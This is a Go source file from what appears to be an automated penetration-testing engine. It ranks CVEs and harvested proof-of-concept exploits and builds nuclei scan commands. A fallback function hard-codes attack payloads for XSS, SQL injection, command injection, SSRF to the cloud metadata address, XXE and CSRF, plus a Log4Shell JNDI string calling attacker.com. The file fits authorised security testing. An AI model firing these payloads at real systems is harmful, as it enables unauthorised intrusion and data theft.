package engine

import (
	"context"
	"fmt"
	"strings"

	"github.com/ares/engine/internal/logger"
)

type CorpusWirer struct {
	correlator *CVECorrelator
	pocCorpus  *PoCCorpus
	memory     *MemoryBridge
}

func NewCorpusWirer() *CorpusWirer {
	return &CorpusWirer{
		correlator: NewCVECorrelator(),
		pocCorpus:  NewPoCCorpus(),
		memory:     nil,
	}
}

func (c *CorpusWirer) WireCorpus() error {
	logger.Info("Initializing corpus components...", logger.Fields{"component": "CorpusWiring"})

	ctx := context.Background()

	if err := c.correlator.FetchEPSS(ctx); err != nil {
		logger.Warn("EPSS fetch error", logger.Fields{"component": "CorpusWiring", "error": err})
	}

	if err := c.correlator.FetchKEV(ctx); err != nil {
		logger.Warn("KEV fetch error", logger.Fields{"component": "CorpusWiring", "error": err})
	}
	if err := c.pocCorpus.Harvest(ctx); err != nil {
		logger.Warn("PoC harvest error", logger.Fields{"component": "CorpusWiring", "error": err})
	}

	logger.Info("Corpus initialization complete", logger.Fields{"component": "CorpusWiring"})
	logger.Info("Correlator ready", logger.Fields{"component": "CorpusWiring", "cve_count": len(c.correlator.corpus)})
	logger.Info("PoC corpus", logger.Fields{"component": "CorpusWiring", "entry_count": len(c.pocCorpus.entries)})

	return nil
}

func (c *CorpusWirer) SetMemory(m *MemoryBridge) {
	c.memory = m
}

func (c *CorpusWirer) NextPayload(vulnType, techStack string) string {
	rankedPoCs := c.pocCorpus.RankedPoCList(vulnType)
	if len(rankedPoCs) > 0 {
		logger.Info("Selected PoC from corpus", logger.Fields{"component": "CorpusWiring", "poc": rankedPoCs[0].PoC, "score": rankedPoCs[0].SynthScore})

		if c.memory != nil {
			c.memory.RecordPayloadOutcome("unknown", vulnType, rankedPoCs[0].PoC, true)
		}

		return rankedPoCs[0].PoC
	}

	cves := c.correlator.CorrelateWithScoring(strings.Split(techStack, ","))
	if len(cves) > 0 {
		logger.Info("Selected CVE", logger.Fields{"component": "CorpusWiring", "cve_id": cves[0].ID, "score": cves[0].SynthScore})

		return cves[0].PoCCommand
	}

	logger.Warn("No payload found", logger.Fields{"component": "CorpusWiring", "vuln_type": vulnType, "tech_stack": techStack})

	return c.fallbackPayload(vulnType)
}

func (c *CorpusWirer) fallbackPayload(vulnType string) string {
	fallbacks := map[string]string{
		"xss":  "<script>alert(1)</script>",
		"sqli": "' OR '1'='1",
		"lfi":  "../../../../etc/passwd",
		"rce":  "; whoami",
		"ssti": "{{7*7}}",
		"jndi": "${jndi:ldap://attacker.com/a}",
		"ssrf": "http://169.254.169.254/",
		"xxe":  "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
		"csrf": `<form action="CHANGE_ME" method="POST"><input type="hidden" name="action" value="delete"><input type="submit"></form><script>document.forms[0].submit()</script>`,
		"idor": `{"id":"00000","email":"victim@target.com","role":"admin"}&id=00001`,
	}

	if p, ok := fallbacks[vulnType]; ok {
		return p
	}

	return "TEST_PAYLOAD"
}

func (c *CorpusWirer) GetRankedCVEs(techStack []string) []RankedCVE {
	return c.correlator.CorrelateWithScoring(techStack)
}

func (c *CorpusWirer) GetRankedPoCs(vulnType string) []RankedPoC {
	return c.pocCorpus.RankedPoCList(vulnType)
}

func (c *CorpusWirer) BuildNucleiCommand(techStack []string) string {
	cves := c.correlator.CorrelateWithScoring(techStack)
	args := c.correlator.BuildNucleiArgs(cves)
	if len(args) == 0 {
		return "nuclei -u TARGET -t cves"
	}
	if args[0] == "-update" {
		return "nuclei -update"
	}
	escaped := make([]string, len(args))
	for i, a := range args {
		if strings.Contains(a, " ") {
			escaped[i] = fmt.Sprintf("%q", a)
		} else {
			escaped[i] = a
		}
	}
	return fmt.Sprintf("nuclei %s", strings.Join(escaped, " "))
}

func (c *CorpusWirer) Correlator() *CVECorrelator {
	return c.correlator
}

func (c *CorpusWirer) PoCCorpus() *PoCCorpus {
	return c.pocCorpus
}

func (c *CorpusWirer) ValidatePoC(poc, targetURL string) (bool, error) {
	return c.pocCorpus.Validate(poc, targetURL)
}

func (c *CorpusWirer) Refresh(ctx context.Context) error {
	logger.Info("Refreshing corpus data...", logger.Fields{"component": "CorpusWiring"})

	if err := c.correlator.FetchEPSS(ctx); err != nil {
		logger.Warn("EPSS refresh failed", logger.Fields{"component": "CorpusWiring", "error": err})
	}

	if err := c.correlator.FetchKEV(ctx); err != nil {
		logger.Warn("KEV refresh failed", logger.Fields{"component": "CorpusWiring", "error": err})
	}

	if err := c.pocCorpus.Harvest(ctx); err != nil {
		logger.Warn("PoC refresh failed", logger.Fields{"component": "CorpusWiring", "error": err})
	}

	logger.Info("Refresh complete", logger.Fields{"component": "CorpusWiring"})
	return nil
}

func (c *CorpusWirer) Summary() string {
	cveCount := len(c.correlator.corpus)
	pocCount := len(c.pocCorpus.entries)

	return fmt.Sprintf("Corpus Summary:\n- CVEs: %d\n- PoCs: %d", cveCount, pocCount)
}
